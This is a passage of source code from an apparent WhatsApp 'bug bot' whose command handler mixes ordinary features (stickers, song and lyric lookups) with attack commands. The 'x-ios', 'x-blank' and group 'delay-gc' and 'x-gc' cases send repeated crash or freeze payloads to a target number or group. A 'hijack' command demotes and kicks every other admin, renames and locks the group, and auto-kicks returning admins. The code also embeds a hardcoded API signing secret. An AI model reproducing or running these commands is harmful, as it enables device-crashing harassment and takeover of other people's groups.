if (!q) return LbReceipt(`\`Example:\` : ${prefix+command} 23480xxxxx`);
victim = text.split("|")[0]
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await kaneki.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await kaneki.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
  if (victim == "2347078612004") {
    return LbReceipt("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
  }
 BugSentX(`┏━𒀭━┓ 🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪  ┗━𒀭━┛
⦿ ᴄᴏʀᴇ ɪɴғᴏ ⦿
┏━━━━━━━━━━━━━━━━━━━━━━┓
│ ◈ ʙᴏᴛ     ──›   🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪  v4 
│ ◈ ᴄᴏᴍᴍᴀɴᴅ  ──›  ${prefix+command}
│ ◈ ᴠᴇʀꜱɪᴏɴ  ──›  4.0 
│ ◈ ᴅᴇᴠ     ──›  🇰​​🇦​​🇳​​🇪​​🇰​​🇮​  
┗━━━━━━━━━━━━━━━━━━━━━━┛

⦿ ᴅᴇᴄʟᴀʀᴀᴛɪᴏɴ ⦿
「━━━━━━━━━━━━━━━━━━━━━━」
  呪いは従うものではない、支配するものだ
  A curse is not to be obeyed, it is to be controlled.
「━━━━━━━━━━━━━━━━━━━━━━」

⦿ ᴄᴜʀꜱᴇ ᴘʀɪɴᴄɪᴘʟᴇ ⦿
⟦ 規則は力の前では無意味 ⟧
⟦ Rules are meaningless before power ⟧`);
for (let i = 0; i < 1; i++) {
await frzInt2(target);
}
    }
    
break;
case 'x-blank': {

if (!q) return LbReceipt(`\`Example:\` : ${prefix+command} 23480xxxxx`);
victim = text.split("|")[0]
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await kaneki.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await kaneki.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
  if (victim == "2347078612004") {
    return LbReceipt("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
  }
 BugSentX(`┏━𒀭━┓ 🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪  ┗━𒀭━┛
⦿ ᴄᴏʀᴇ ɪɴғᴏ ⦿
┏━━━━━━━━━━━━━━━━━━━━━━┓
│ ◈ ʙᴏᴛ     ──›   🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪  v4 
│ ◈ ᴄᴏᴍᴍᴀɴᴅ  ──›  ${prefix+command}
│ ◈ ᴠᴇʀꜱɪᴏɴ  ──›  4.0 
│ ◈ ᴅᴇᴠ     ──›  🇰​​🇦​​🇳​​🇪​​🇰​​🇮​  
┗━━━━━━━━━━━━━━━━━━━━━━┛

⦿ ᴅᴇᴄʟᴀʀᴀᴛɪᴏɴ ⦿
「━━━━━━━━━━━━━━━━━━━━━━」
  呪いは従うものではない、支配するものだ
  A curse is not to be obeyed, it is to be controlled.
「━━━━━━━━━━━━━━━━━━━━━━」

⦿ ᴄᴜʀꜱᴇ ᴘʀɪɴᴄɪᴘʟᴇ ⦿
⟦ 規則は力の前では無意味 ⟧
⟦ Rules are meaningless before power ⟧`);
for (let i = 0; i < 1; i++) {
await stuckLogoX(kaneki, target);
}
    }
    
break;
case 'x-ios': {

if (!q) return BugSentX(`\`Example:\` : ${prefix+command} 23480xxxxx`);
victim = text.split("|")[0]
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await kaneki.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await kaneki.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
  if (victim == "2347078612004") {
    return BugSentX("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
  }

 BugSentX(`┏━𒀭━┓ 🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪  ┗━𒀭━┛
⦿ ᴄᴏʀᴇ ɪɴғᴏ ⦿
┏━━━━━━━━━━━━━━━━━━━━━━┓
│ ◈ ʙᴏᴛ     ──›   🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪  v4 
│ ◈ ᴄᴏᴍᴍᴀɴᴅ  ──›  ${prefix+command}
│ ◈ ᴠᴇʀꜱɪᴏɴ  ──›  4.0 
│ ◈ ᴅᴇᴠ     ──›  🇰​​🇦​​🇳​​🇪​​🇰​​🇮​  
┗━━━━━━━━━━━━━━━━━━━━━━┛

⦿ ᴅᴇᴄʟᴀʀᴀᴛɪᴏɴ ⦿
「━━━━━━━━━━━━━━━━━━━━━━」
  呪いは従うものではない、支配するものだ
  A curse is not to be obeyed, it is to be controlled.
「━━━━━━━━━━━━━━━━━━━━━━」

⦿ ᴄᴜʀꜱᴇ ᴘʀɪɴᴄɪᴘʟᴇ ⦿
⟦ 規則は力の前では無意味 ⟧
⟦ Rules are meaningless before power ⟧`);
for (let i = 0; i < 100; i++) {
await DCrashIos(kaneki, target);
await new Promise(r => setTimeout(r, 1000));
   } 
}
break;

//====================[ CASE BUG GROUP ]===========================//
case 'delay-gc': {
    if (!m.isGroup) return LbReceipt('This command can only be used in a group!');
    BugSentX(`[ # ] ɢᴄ ɪs ɢᴏɪɴɢ ᴅᴏᴡɴ ɴᴏᴡ
 _*\`sᴛᴀᴛᴜs\`*_ : *sᴜᴄᴄᴇssғᴜʟʟʏ ᴀᴛᴛᴀᴄᴋᴇᴅ*
 _*\`ʙᴜɢ ᴛʏᴘᴇ\`*_ : _${command}_
> ᴡᴀɪᴛ ғɪᴠᴇ ᴍɪɴᴜᴛᴇs ᴛᴏ ᴀᴠᴏɪᴅ ʙᴀɴ`);
    for (let i = 0; i < 666; i++) {
await R9X2(kaneki, m.chat, false);
await sleep(2000);
await ExoGsButonsRspn(m.chat, true);
        }
    }
break;
case 'x-gc': {
    if (!m.isGroup) return LbReceipt('This command can only be used in a group!');
     BugSentX(`[ # ] ɢc ɪs ɢᴏɪɴɢ ᴅᴏᴡɴ ɴᴏᴡ
 _*\`sᴛᴀᴛᴜs\`*_ : *sᴜᴄᴄᴇssғᴜʟʟʏ ᴀᴛᴛᴀᴄᴋᴇᴅ*
 _*\`ʙᴜɢ ᴛʏᴘᴇ\`*_ : _${command}_
> ᴡᴀɪᴛ ғɪᴠᴇ ᴍɪɴᴜᴛᴇs ᴛᴏ ᴀᴠᴏɪᴅ ʙᴀɴ`);
    for (let i = 0; i < 1; i++) {
await frzInt(m.chat);
await sleep(5000);
        }
    }
break;
case 'antilink': {
    if (!m.isGroup) return reply("This command only works in group chats.");
    if (!isAdmins) return reply("Only group admins can use this command.");
    if (!args[0]) return reply("Use: .antilink on / off");

    const status = args[0].toLowerCase();

    if (status === 'on') {
        global._antilink[m.chat] = true;
        return reply("Antilink is now *enabled* in this group.");
    } else if (status === 'off') {
        global._antilink[m.chat] = false;
        return reply("Antilink is now *disabled* in this group.");
    } else {
        return reply("Invalid. Use on/off.");
    }
}
break;
case "device": case "checkdevice": {
    // ===== GET REPLIED MESSAGE INFO =====
    const ctx = m.message?.extendedTextMessage?.contextInfo;

    if (!ctx || !ctx.stanzaId || !ctx.participant) {
        return await kaneki.sendMessage(from, {
            text: "-(🕯️) Reply to a user's recent message to reveal their device."
        }, { quoted: m })
    }

    const quotedId = ctx.stanzaId;
    const userJid = ctx.participant;
    const number = userJid.split("@")[0];

    // ===== DEVICE DETECTION via getDevice (number-based) =====
    let device;
    try {
        device = getDevice(quotedId);
        // Normalize to readable label
        if (device === "android") device = "A N D R O I D";
        else if (device === "ios") device = "I P H O N E";
        else if (device === "web") device = "W A - W E B";
        else if (device === "desktop") device = "D E S K T O P";
        else device = device?.toUpperCase() || "U N K N O W N";
    } catch (e) {
        // Fallback pattern logic if getDevice fails
        if (quotedId.startsWith("3EB0")) device = "W A - W E B";
        else if (quotedId.startsWith("BAE5")) device = "A N D R O I D";
        else if (quotedId.startsWith("BAE9")) device = "I P H O N E";
        else if (quotedId.length > 21) device = "A N D R O I D";
        else device = "I P H O N E";
    }

    // ===== RADIATION RESPONSE STYLE =====
    const deviceText = `-(☘️) DEVICE CHECK\n@${number}\nDevice: *${device}*`;

    await kaneki.sendMessage(from, {
        text: deviceText,
        mentions: [userJid]
    }, { quoted: m })

}
break
case 'sticker': case 's': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
  if (!m.quoted) return reply(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await kaneki.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    try { if (encmedia) fs.unlinkSync(encmedia); } catch (_) {}
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return m.reply('max 10s');
    
    let media = await quoted.download();
    let encmedia = await kaneki.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    try { if (encmedia) fs.unlinkSync(encmedia); } catch (_) {}
  } else {
    return reply(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}
// WAGWANNNN

      break
            
      
//========================================================\\
        case'brat':{
            if (!text) return reply(`text? example ${prefix + command} apanih cok`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${text}`;
            await reaction(m.chat, "⚡")
            await makeStickerFromUrl(imageUrl, kaneki, m);
        }
       break
//========================================================\\
    case 'play1': {
    if (!text) return reply(`provide a song name dude, Example: ${prefix + command} ʏᴏᴜᴛᴜʙᴇʀ ʙʏ ʟᴏʀᴅ ᴅᴇᴍᴍʏ`);

    const query = text.trim(); 
    await kaneki.sendMessage(m.chat, { react: { text: "🎙️", key: m.key } });

    try {
        const response = await axios.post('http://kinchan.sytes.net/ytdl/search', { text: query });
        const video = response.data;

        if (!video || !video.title) {
            return reply('process....');
        }

        const url = video.url;
        const audioFormat = 'ogg';

        const downloads = await axios.post('http://kinchan.sytes.net/ytdl/downloader', {
            url: url,
            format: audioFormat
        });

        const { title, downloadUrl } = downloads.data;

        const audios = await axios.get(downloadUrl, { responseType: 'arraybuffer' });
        const audio = Buffer.from(audios.data, 'binary');

        const thumbnails = await axios.get(video.thumbnail, { responseType: 'arraybuffer' });
        const thumbnail = Buffer.from(thumbnails.data, 'binary');

        await kaneki.sendMessage(m.chat, {
            audio: audio,
            mimetype: 'audio/mp4',
            fileName: `${title}.mp3`,
            contextInfo: {
                isForwarded: true,
                forwardingScore: 99999,
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    previewType: 2,
                    mediaUrl: url,
                    title: title,
                    body: `views: ${video.views} / duration: ${video.timestamp}`,
                    sourceUrl: url,
                    thumbnail: thumbnail,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });

    } catch (error) {
        console.error('Error:', error);
        reply('Could not find your song.');
    }
}
break
        //========================================================\\
        
    case "video":
    case "vid":{
                if (!text) return reply(`\n*ᴇxᴀᴍᴘʟᴇ:* ${prefix + command} golden\n`)
           await kaneki.sendMessage(m.chat, {
 react: { text: '🎥', key: m.key }
 });   try{  
              await reply(`processing your request`);
                let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
                let ahh = mbut.result
                let crot = ahh.download.video

                kaneki.sendMessage(m.chat, {
                    video: { url: crot },
                    mimetype: "video/mp4"
                }, { quoted:m });
                }catch (err) {
console.error('ᴇʀʀᴏʀ ᴡʜɪʟᴇ ғᴇᴛᴄʜɪɴɢ ᴠɪᴅᴇᴏ:', err);
await reply(`ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ: ${err.message}`);
}
                
}
break      
 
    

         
 
        //========================================================\\
  case 'play': 
case 'ytplay': {
if (!text) return reply(`Example: ${prefix + command} golden`);
try {		
let search = await yts(`${text}`);
if (!search || search.all.length === 0) return reply(`*!* ☹️`);
let { videoId, image, title, views, duration, author, ago, url, description } = search.all[0];
let caption = `「 *YOUTUBE PLAY* 」\n\n🆔 ID : ${videoId}\n💬 Title : ${title}\n📺 Views : ${views}\n⏰ Duration : ${duration.timestamp}\n▶️ Channel : ${author.name}\n📆 Upload : ${ago}\n🔗 URL Video : ${url}\n📝 Description : ${description}`;
kaneki.sendMessage(m.chat,{
image: { url: image },
caption: caption,
footer: `${global.foother}`,
buttons: [
{
buttonId: `${prefix}song ${text}`,
buttonText: {
displayText: "ᴠᴏɪᴄᴇɴᴏᴛᴇ🎙️"
}
},
    {
buttonId: `${prefix}play1 ${text}`,
buttonText: {
displayText: "Aᴜᴅɪᴏ🎧"
}
},
{
buttonId: `${prefix}video ${url}`,
buttonText: {
displayText: "Vɪᴅᴇᴏ🎥"
}
}
],
viewOnce: true,
}, {
quoted: m
});
} catch (err) {
console.error(err);
reply(`*error!* 😭\n${err.message || err}`);
}
}
break
case 'savenumber': {
    try {
        const input = args.join(' '); // args = ['08123456789,', 'John', 'Doe']
        const [numberPart, ...nameParts] = input.split(',');
        const number = numberPart?.trim();
        const name = nameParts.join(',').trim();

        if (!number || !name) {
            return reply('❌ Use the format: savenumber number, name\nExample: savenumber 08123456789, mary dane');
        }

        const filePath = './savedNumbers.json';

        // Create file if it doesn't exist
        if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify([]));
        }

        const savedList = JSON.parse(fs.readFileSync(filePath));
        savedList.push({ number, name });

        fs.writeFileSync(filePath, JSON.stringify(savedList, null, 2));

        reply(`✅ Number saved: ${name} (${number})`);
    } catch (err) {
        console.error(err);
        reply('❌ An error occurred while saving the number.');
    }
}
break;
case 'hijack': {
  if (!isCreator) return reply('⛔ Owner only.');
  if (!m.isGroup) return reply('⚠️ This command can only be used inside a group.');

  // ── fetch FRESH metadata — never rely on stale BotAdmins here ───────────────
  const hjMeta      = await kaneki.groupMetadata(m.chat);
  const hjParts     = hjMeta.participants;
  const hjSenderJid = m.sender;
  // Strip device suffix (e.g. 123:5@s.whatsapp.net → 123@s.whatsapp.net)
  const _stripDev   = jid => jid?.replace(/:\d+@/, '@') || jid;
  const hjBotJid    = _stripDev(botNumber);

  // ── check bot is actually admin (fresh check) ────────────────────────────────
  const hjBotIsAdmin = hjParts.some(p => _stripDev(p.id) === hjBotJid && p.admin);
  if (!hjBotIsAdmin) return reply('⚠️ Make the bot an admin first.');

  // ── step 1: promote sender FIRST so they keep access throughout ──────────────
  const hjSenderIsAdmin = hjParts.some(p => _stripDev(p.id) === _stripDev(hjSenderJid) && p.admin);
  if (!hjSenderIsAdmin) {
    try { await kaneki.groupParticipantsUpdate(m.chat, [hjSenderJid], 'promote'); } catch(_) {}
  }

  // ── step 2: find all other admins to target ──────────────────────────────────
  const otherAdmins = hjParts.filter(p =>
    p.admin &&
    _stripDev(p.id) !== hjBotJid &&
    _stripDev(p.id) !== _stripDev(hjSenderJid)
  ).map(p => p.id);

  if (!otherAdmins.length) {
    return reply('ℹ️ No other admins to demote/kick in this group.');
  }

  await reply(`⚡ *HIJACK STARTED*\n🎯 Targeting ${otherAdmins.length} admin(s)…`);
  await kaneki.sendMessage(m.chat, { react: { text: '🔥', key: m.key } });

  // ── step 3: demote all other admins ─────────────────────────────────────────
  try {
    await kaneki.groupParticipantsUpdate(m.chat, otherAdmins, 'demote');
  } catch (e) { console.error('[hijack] demote error:', e.message); }
  await sleep(1000);

  // ── step 4: kick them in batches ────────────────────────────────────────────
  let kicked = 0, failed = 0;
  const BATCH = 5;
  for (let i = 0; i < otherAdmins.length; i += BATCH) {
    const batch = otherAdmins.slice(i, i + BATCH);
    try {
      await kaneki.groupParticipantsUpdate(m.chat, batch, 'remove');
      kicked += batch.length;
    } catch (e) {
      failed += batch.length;
      console.error('[hijack] kick error:', e.message);
    }
    await sleep(1000);
  }

  // ── step 5: rename group ─────────────────────────────────────────────────────
  try { await kaneki.groupUpdateSubject(m.chat, '🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪  — KEN'); } catch(_) {}

  // ── step 6: update description ───────────────────────────────────────────────
  try { await kaneki.groupUpdateDescription(m.chat,
` 🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪  ᴠ4 — ʜɪᴊᴀᴄᴋᴇᴅ ʙʏ KEN

This group is now under new management.
Rules:
1. No disrespect tolerated.
2. No external links or invites.
3. kaneki Tech is right.

Telegram: t.me/certifiedloner_16`
  ); } catch(_) {}

  // ── step 7: lock group to admins-only ───────────────────────────────────────
  try { await kaneki.groupSettingUpdate(m.chat, 'announcement'); } catch(_) {}

  // ── step 8: rejoin guard — auto-kick returning admins for 10 min ─────────────
  const kickedSet      = new Set(otherAdmins.map(_stripDev));
  const guardStart     = Date.now();
  const GUARD_DURATION = 10 * 60 * 1000;
  const rejoinGuard    = async (update) => {
    if (Date.now() - guardStart > GUARD_DURATION) {
      kaneki.ev.off('group-participants.update', rejoinGuard);
      return;
    }
    if (update.id !== m.chat || update.action !== 'add') return;
    const rejoiners = update.participants.filter(jid =>
      kickedSet.has(_stripDev(jid)) &&
      _stripDev(jid) !== hjBotJid &&
      _stripDev(jid) !== _stripDev(hjSenderJid)
    );
    if (!rejoiners.length) return;
    try {
      await kaneki.groupParticipantsUpdate(m.chat, rejoiners, 'remove');
      await kaneki.sendMessage(m.chat, { text: `🔄 Auto-kicked ${rejoiners.length} rejoiner(s).` });
    } catch (e) { console.error('[hijack] rejoin guard error:', e.message); }
  };
  kaneki.ev.on('group-participants.update', rejoinGuard);

  await reply(
`✅ *HIJACK COMPLETE*
┌─────────────────────
│ 🎯 Admins targeted : ${otherAdmins.length}
│ 👊 Kicked          : ${kicked}
│ ⚠️ Failed          : ${failed}
│ 🔒 Group           : Locked (admin-only)
│ 🛡️ Guard           : Active 10 min
└─────────────────────
> 🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪  ᴠ4 ʙʏ KEN`
  );
}break
 case 'clearbugs': {
if (!isCreator) return reply(`Sorry, owner only`)
if (!q) return reply(`Example:\n ${prefix + command} 234xxx`)
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
kaneki.sendMessage(target, {text: `\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
}
break;
  
// ================= BUG MENU ================= //
//===========================================
//==========================================
case 'setname':{
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply('owner only')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!text) return reply(`Where's the name?\nExample: ${prefix + command}`)
await updateProfileName(text)
reply(`Success in changing the name of bot's number`)
}
break;
//==========================================
case 'setbio':{
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply('owner only')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!text) return reply(`Where's the name?\nExample: ${prefix + command}`)
await kaneki.updateProfileStatus(text)
reply(`Success in changing the bio of bot's number`)
}
break
//==========================================
case 'getcase': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply('owner only')
const getCases = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("./start/case.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
reply(`${getCases(q)}`)}
break;
//==========================================
case 'setgcname': case 'setgroupname': case 'setsubject': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply('owner only')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!text) return reply('Text ?')
await kaneki.groupUpdateSubject(m.chat, text)
await reply(`Done`)
}
break;
//==========================================
case 'setgcdesc': case 'setdesk': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply('owner only')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!text) return reply('Text ?')
await kaneki.groupUpdateDescription(m.chat, text)
await reply(`Done`)
}
break
 //====================

//==========================================
case 'toimage': 
case 'toimg': {
if (!isCreator) return
if (!/webp/.test(mime)) return reply(`reply sticker with caption *${prefix + command}*`)
let media = await kaneki.downloadAndSaveMediaMessage(quoted)
await reaction(m.chat, "⚡")
let ran = getRandomFile('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
try { fs.unlinkSync(media) } catch (_) {}
if (err) return console.error('[toimage] ffmpeg error:', err)
let buffer = fs.readFileSync(ran)
kaneki.sendMessage(m.chat, {   
image: buffer     
}, { quoted: zets })
try { fs.unlinkSync(ran) } catch (_) {}
}
)
}
break;
//==========================================
case 'lyrics': {
    if (!args[0]) return m.reply('Please provide a song title.\nExample: *.lyrics Shape of You*\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɪʀᴇ');

    const songTitle = args.join(" ");
    const apiUrl = `https://kaiz-apis.gleeze.com/api/shazam-lyrics?title=${encodeURIComponent(songTitle)}`;

    try {
        const res = await axios.get(apiUrl);
        const data = res.data;

        if (!data || !data.lyrics) {
            return m.reply('Sorry, no lyrics found for this song.\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ KEN');
        }

        const lyrics = data.lyrics;

        // Send the lyrics as a message
        await kaneki.sendMessage(m.chat, {
            text: `*𝗦𝗼𝗻𝗴:* _${songTitle}_\n\n*𝗟𝘆𝗿𝗶𝗰𝘀:*\n\n${lyrics}`
        }, { quoted: m });

    } catch (err) {
        console.error('Lyrics Error:', err);
        m.reply("An error occurred while fetching the lyrics.\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ KEN");
    }
}
break
case 'tolyrics': {
function generateToken(secretKey) {
 const timestamp = Date.now().toString();
 const hmac = crypto.createHmac('sha256', secretKey);
 hmac.update(timestamp);
 const token = hmac.digest('hex');

 return {
 "x-timestamp": timestamp,
 "x-token": token
 };
}

async function Talknotes(buffer) {
 try {
 const form = new FormData();
 form.append('file', buffer, {
 filename: 'file1.mp3',
 contentType: 'audio/mpeg'
 });

 const tokenData = generateToken('w0erw90wr3rnhwoi3rwe98sdfihqio432033we8rhoeiw');
 const headers = {
 ...form.getHeaders(),
 'x-timestamp': tokenData['x-timestamp'],
 'x-token': tokenData['x-token'],
 "authority": "api.talknotes.io",
 "method": "POST",
 "path": "/tools/converter",
 "scheme": "https",
 "accept": "*/*",
 "accept-encoding": "gzip, deflate, br",
 "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
 "origin": "https://talknotes.io",
 "referer": "https://talknotes.io/",
 "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
 "sec-ch-ua-mobile": "?1",
 "sec-ch-ua-platform": "\"Android\"",
 "sec-fetch-dest": "empty",
 "sec-fetch-mode": "cors",
 "sec-fetch-site": "same-site",
 "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"
 };

 const response = await axios.post('https://api.talknotes.io/tools/converter', form, { headers });
 return response.data;
 } catch (error) {
 console.error("An error occurred:", error.message);
 return null;
 }
}
 
 if (!/audio|video/.test(mime)) {
 return reply('reply video/ audio using .tolyrics');
 }
 
 reply('*Please Wait...*');
 
 try {
 let buffer = await quoted.download();
 
 const fileSizeInBytes = buffer.length;
 const maxSize = 5 * 1024 * 1024;

 if (fileSizeInBytes > maxSize) {
 return reply("Max Size 5 MB Yaa");
 }

 const result = await Talknotes(buffer);
 
 if (!result || !result.text) {
 return reply('avoid spam');
 }
 
 reply(`*Result :*\n\n${result.text}`);
 
 } catch (error) {
 console.error(error);
 reply('error.');
 }
}
          break;
          case 'groupjid':{
          if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
        const gjMeta = m.isGroup ? await kaneki.groupMetadata(m.chat).catch((e) => {}) : ""
        const gjParticipants = m.isGroup ? gjMeta.participants : []
    let textt = `_Here is the jid address of all the users of_\n *- ${gjMeta.subject}*\n\n`
    for (let mem of gjParticipants) {
            textt += `👤 ${mem.id}\n`
        }
      reply(textt)
    }
    break;
    case 'poll': {
